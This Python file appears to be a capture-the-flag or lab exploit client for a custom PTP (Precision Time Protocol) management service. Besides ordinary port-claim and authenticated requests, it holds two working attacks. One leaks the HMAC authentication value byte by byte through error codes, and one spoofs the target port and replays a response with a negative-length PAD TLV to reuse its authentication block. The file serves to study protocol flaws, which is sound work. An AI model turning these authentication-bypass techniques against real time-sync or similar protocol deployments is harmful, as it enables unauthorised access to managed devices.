import sys
sys.path.append("build")

import socket
import ptp_protocol
import ptp_message
import uuid
import hmac
import hashlib
import struct

class PtpManagement:
    SERVER_ADDRESS = "172.21.0.2"
    SERVER_PORT_EVENT = 319
    SERVER_PORT_GENERAL = 320
    BUFFER_SIZE = 1500

    def __init__(self, target_id, target_port, clock_id=uuid.getnode(), port=2):
        self.target_id = target_id
        self.target_port = target_port

        self.clock_id = clock_id
        self.port = port

        self.sequence_number = 0

    def __enter__(self):
        # To be standard compliant we would need two sockets and bind to the assigned ports.
        # However this would lead to issues with the NAT.
        # Also the packets are still dissected by wireshark this way. 
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.settimeout(0.1)

        return self

    def __exit__(self, exc_type, exc_value, traceback):
        self.socket.close()

    def send_raw(self, request, event=False):
        port = self.SERVER_PORT_EVENT if event else self.SERVER_PORT_GENERAL
        self.socket.sendto(request, (self.SERVER_ADDRESS, port))

    def receive_raw(self):
        response, server = self.socket.recvfrom(self.BUFFER_SIZE)

        return response

    def send(self, message, event=False):
        request = message.encode(self.BUFFER_SIZE)
        self.send_raw(request, event)

    def receive(self):
        response = self.receive_raw()
        
        message = ptp_message.from_buffer(response)

        if (message.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT):
            raise RuntimeError("Expected management message")

        for tlv in message.get_tlvs():
            if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT:
                if tlv.payload.management.id == ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION:
                    print("Received user description: {}".format(ptp_protocol.ffi.string(tlv.payload.management.payload.user_description).decode()))
            if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
                print("Received management error: {}".format(ptp_protocol.ffi.string(tlv.payload.management_error_status.display_data).decode()))

        return message
    
    def add_auth_tlv(self, message):
        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION)
        tlv.payload.authentication.spp = 0
        tlv.payload.authentication.security_parameter_indicatior = 0
        tlv.payload.authentication.key_id = 0
        tlv.payload.authentication.icv_length = 16

    def finalize_auth_tlvs(self, request, secret="", icv=None):
        message = ptp_message.from_buffer(request)
        buffer_address = ptp_protocol.ffi.cast("uint8_t *", ptp_protocol.ffi.addressof(ptp_protocol.ffi.from_buffer(request)))

        for tlv in message.get_tlvs():
            if tlv.type != ptp_protocol.lib.PTP_TLV_TYPE_AUTHENTICATION:
                continue

            icv_address = tlv.payload.authentication.icv

            if icv == None:
                icv = hmac.new(secret, bytearray(request)[:icv_address-buffer_address], hashlib.sha256).digest()

            ptp_protocol.ffi.memmove(icv_address, icv[:16], 16)

    def claim_port(self, secret, description):
        secret = secret.encode('utf-8')
        if (len(secret) > 100):
            raise ValueError("Secret too large")

        description = description.encode('utf-8')
        if (len(description) > 128):
            raise ValueError("User description too large")
        
        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
        self.sequence_number += 1

        payload = message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_COMMAND
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_IMPLEMENTATION_SPECIFIC_PORT_CLAIM
        ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.port_secret, secret + b'\0', len(secret) + 1)
        ptp_protocol.ffi.memmove(tlv.payload.management.payload.port_claim.user_description, description + b'\0', len(description) + 1)
        
        self.send(message)
        response = self.receive()

    def get_user_description(self, secret):
        secret = secret.encode('utf-8') + b'\x00' * (100 - len(secret))

        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)
        self.sequence_number += 1

        payload = message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        self.add_auth_tlv(message)

        request = message.encode(self.BUFFER_SIZE)
        self.finalize_auth_tlvs(request, secret=secret)

        self.send_raw(request)
        response = self.receive()

    def get_user_description_exploit_strcmp(self):
        icv = bytearray(16)

        message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, self.clock_id, self.port, self.sequence_number)

        payload = message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_GET
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        self.add_auth_tlv(message)
        request = message.encode(self.BUFFER_SIZE)

        for i in range(len(icv) + 1):
            self.finalize_auth_tlvs(request, icv=icv)

            self.send_raw(request)
            response = self.receive()

            if (response.decoded.type != ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT):
                raise RuntimeError("Expected management message")

            for tlv in response.get_tlvs():
                if tlv.type == ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT_ERROR_STATUS:
                    icv[i] = tlv.payload.management_error_status.error_id - 0xc000

    def get_user_description_exploit_replay(self):
        # Spoof target port
        initial_message = ptp_message.from_parameters(ptp_protocol.lib.PTP_MESSAGE_TYPE_MANAGEMENT, 0x0200000000000000 + self.target_id, self.target_port, self.sequence_number)

        payload = initial_message.get_payload()
        payload.management.target_port_id.clock_id = (0x0200000000000000 + self.target_id).to_bytes(8, byteorder="big")
        payload.management.target_port_id.port = self.target_port
        payload.management.action = ptp_protocol.lib.PTP_MANAGEMENT_ACTION_RESPONSE
        payload.management.starting_boundary_hops = 0
        payload.management.boundary_hops = 0

        tlv = initial_message.add_tlv(ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT)
        tlv.payload.management.id = ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION

        self.add_auth_tlv(initial_message)

        self.send(initial_message)
        response = self.receive_raw()

        altered_request = bytearray(response).rstrip(b'\0')[:-4]

        tlv_get_message = struct.pack("!HhHH", ptp_protocol.lib.PTP_TLV_TYPE_MANAGEMENT, 4, ptp_protocol.lib.PTP_MANAGEMENT_ID_USER_DESCRIPTION, 0)
        tlv_pad_message = struct.pack("!Hh", ptp_protocol.lib.PTP_TLV_TYPE_PAD, -38) # Jump back to auth TLV
        altered_request += tlv_get_message + tlv_pad_message

        if (len(response) < len(altered_request)):
            raise RuntimeWarning("Not enough TLV tailroom")
        
        altered_request += b'\0' * (len(response) - len(altered_request))

        self.send_raw(altered_request)
        response = self.receive()

def main():
    with PtpManagement(42, 2001) as management:
        print("Claim port")
        management.claim_port("password", "my port")
        print()

        print("Get user description")
        management.get_user_description("password")
        print()

        print("Exploit")
        management.get_user_description_exploit_strcmp()
        management.get_user_description_exploit_replay()

if __name__ == "__main__":
    main()

